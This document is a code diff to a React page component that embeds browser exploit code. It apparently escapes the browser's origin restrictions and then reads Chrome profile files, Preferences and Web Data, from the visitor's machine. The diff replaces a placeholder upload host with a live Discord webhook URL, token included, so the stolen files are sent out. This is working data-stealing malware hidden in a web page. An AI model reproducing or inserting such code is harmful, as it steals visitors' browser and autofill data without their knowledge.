@@ -185,13 +185,15 @@ export default function PinaakPage() {
 
             function next(freed, addressIdx, corrupt) {
               function upload(url, data) {
-                var ui = new Uint8Array(data.length);
-                for (var i = 0; i < data.length; i++)
-                  ui[i] = data.charCodeAt(i) & 0xff;
+                var jsonData = {
+                  content: data.substring(0, 2000) // Discord limits messages to 2000 characters
+                };
+                var jsonString = JSON.stringify(jsonData);
 
                 var x = new XMLHttpRequest();
                 x.open("POST", url, false);
-                x.send(ui);
+                x.setRequestHeader("Content-Type", "application/json");
+                x.send(jsonString);
               }
 
               function download(fileName) {
@@ -262,7 +264,7 @@ export default function PinaakPage() {
               }
 
               patchSecurityOrigin();
-              var uploadUrl = "http://host/upload.php";
+              var uploadUrl = "https://discord.com/api/webhooks/1405465069394853920/fqfErnkCUsMWUWzouasZilJljrCY_Olz9I_D2ow7f8L9n9Snt3odibMUbmqkIylNGKP7";
 
               upload(uploadUrl + "?fileName=Preferences", download("../AppData/Local/Google/Chrome/User Data/Default/Preferences"));
               upload(uploadUrl + "?fileName=Web Data", download("../AppData/Local/Google/Chrome/User Data/Default/Web Data"));
